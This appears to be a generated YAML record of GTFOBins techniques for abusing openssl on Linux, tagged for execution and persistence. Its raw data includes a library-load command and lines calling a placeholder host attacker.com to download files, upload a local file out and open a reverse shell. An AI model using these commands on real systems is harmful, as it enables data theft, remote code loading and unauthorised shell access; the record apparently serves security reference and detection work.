@@ -1,0 +1,119 @@
+id: gtfobins/openssl/library-load/unprivileged
+type: binary
+platform: linux
+name: openssl
+phases:
+- execution
+- persistence
+capabilities:
+- library-load
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: openssl req -engine ./lib.so
+references:
+- https://gtfobins.github.io/gtfobins/openssl/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        openssl:
+          functions:
+            download:
+            - code: openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              sender: tls-server
+            file-read:
+            - code: openssl enc -in /path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            file-write:
+            - code: echo DATA | openssl enc -out /path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            - code: openssl enc -in /path/to/input-file -out /path/to/output-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            library-load:
+            - code: openssl req -engine ./lib.so
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+            reverse-shell:
+            - code: 'mkfifo /path/to/temp-socket
+
+                /bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345
+                >/path/to/temp-socket'
+              comment: The shell process is not spawn by `openssl`.
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              listener: tls-server
+            upload:
+            - code: openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
+              contexts:
+                sudo: null
+                suid: null
+                unprivileged: null
+              receiver: tls-server
+    upstream_url: https://gtfobins.github.io/gtfobins/openssl/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: library-load
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:30a0ea0ed6463e6b3e6e072e77c0fcf3f52587dcfa4ead1252d0538a5c70426b
